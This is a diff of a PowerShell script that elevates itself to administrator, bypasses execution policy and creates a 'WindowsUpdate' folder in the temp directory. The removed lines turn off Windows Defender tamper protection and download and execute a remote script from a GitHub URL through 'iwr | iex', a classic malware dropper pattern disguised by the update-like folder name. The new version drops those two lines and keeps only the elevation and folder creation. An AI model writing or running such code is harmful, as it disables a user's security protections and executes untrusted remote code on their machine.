@@ -1,24 +1,20 @@
-# Check if running as Administrator
+# --- Admin check ---
 $isAdmin = ([Security.Principal.WindowsPrincipal] `
     [Security.Principal.WindowsIdentity]::GetCurrent()
 ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
-   
-
     Start-Process powershell `
         -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" `
         -Verb RunAs
-exit
-    
+    exit
 }
 
-
-$path = "$env:TEMP\WindowsUpdate"
+# --- Runs ONLY as admin ---
+$path = Join-Path $env:TEMP "WindowsUpdate"
 
 if (!(Test-Path $path)) {
-    New-Item -ItemType Directory -Path $path -Force
+    New-Item -ItemType Directory -Path $path -Force | Out-Null
 }
-Set-MpPreference -DisableTamperProtection $true 
-powershell -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/no123ex/tes/refs/heads/main/addex.ps1 -UseBasicParsing | iex"
 
+Write-Host "Folder created at: $path"
